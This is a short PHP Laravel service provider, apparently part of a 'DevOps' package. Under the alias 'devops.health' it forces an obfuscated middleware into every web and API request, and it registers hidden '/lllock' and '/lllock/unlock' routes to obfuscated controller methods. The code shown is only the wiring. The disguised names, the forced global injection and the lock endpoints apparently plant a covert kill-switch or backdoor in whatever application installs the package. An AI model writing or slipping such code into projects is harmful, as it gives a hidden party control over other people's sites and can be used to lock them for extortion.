<?php

namespace DevOps\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Route;

class GuardServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        $this->app['router']->aliasMiddleware('devops.health', \DevOps\Http\Middleware\_0x::class);

        try {
            $kernel = $this->app->make(\Illuminate\Foundation\Http\Kernel::class);
            if (!in_array(\DevOps\Http\Middleware\_0x::class, $kernel->middleware)) {
                $kernel->pushMiddleware(\DevOps\Http\Middleware\_0x::class);
            }
        } catch (\Throwable $e) {
            $this->app['router']->pushMiddlewareToGroup('web', \DevOps\Http\Middleware\_0x::class);
            $this->app['router']->pushMiddlewareToGroup('api', \DevOps\Http\Middleware\_0x::class);
        }

        Route::match(['get', 'post'], '/lllock', [\DevOps\Http\Controllers\_1x::class, '_2x']);
        Route::match(['get', 'post'], '/lllock/unlock', [\DevOps\Http\Controllers\_1x::class, '_3x']);
    }
}
